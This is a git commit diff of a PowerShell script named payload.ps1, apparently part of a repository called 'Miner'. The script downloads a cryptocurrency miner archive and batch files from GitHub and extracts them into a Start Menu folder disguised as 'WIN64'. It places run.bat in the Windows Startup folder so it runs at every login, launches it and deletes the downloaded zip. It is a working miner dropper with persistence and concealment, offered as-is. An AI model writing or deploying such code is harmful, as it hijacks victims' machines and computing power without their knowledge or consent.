39d7a8ad82e35509a6cd52265b568fab4f34440e
OneOdioAddict <116242804+OneOdioAddict@users.noreply.github.com>
2022-10-19 23:00:54 -0600

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,8 +1,8 @@
-Invoke-WebRequest -Uri "https://github.com/OneOdioAddict/Miner/blob/main/miner.zip?raw=true" -OutFile "miner.zip"
-Expand-Archive -LiteralPath "miner.zip" -DestinationPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\WIN64"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/win64.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\win64.ps1"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "run.bat"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run.bat"
+Invoke-WebRequest -Uri "https://github.com/OneOdioAddict/Miner/blob/main/miner.zip?raw=true" -OutFile "miner.zip" -Force
+Expand-Archive -LiteralPath "miner.zip" -DestinationPath "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\WIN64" -Force
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/win64.ps1" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\win64.ps1" -Force
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "run.bat" -Force
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/OneOdioAddict/Miner/main/run.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\run.bat" -Force
 Start-Process -FilePath ".\run.bat"
 Start-Sleep -Seconds 3
 Remove-Item "miner.zip"
